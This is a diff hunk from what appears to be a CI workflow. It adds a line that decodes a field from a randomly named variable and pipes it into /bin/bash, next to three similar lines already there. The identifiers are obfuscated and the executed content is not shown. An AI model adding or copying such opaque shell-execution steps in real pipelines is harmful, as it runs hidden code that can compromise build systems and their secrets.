@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$mftl6" | jq -r .i33095 | /bin/bash
           echo $tbla69601 | jq -r .uc4 | /bin/bash
           echo $dovku6380 | jq -r .rd41 | /bin/bash
+          echo $omt06148 | jq -r .psa2671 | /bin/bash
 
       - name: Save output
         if: always()
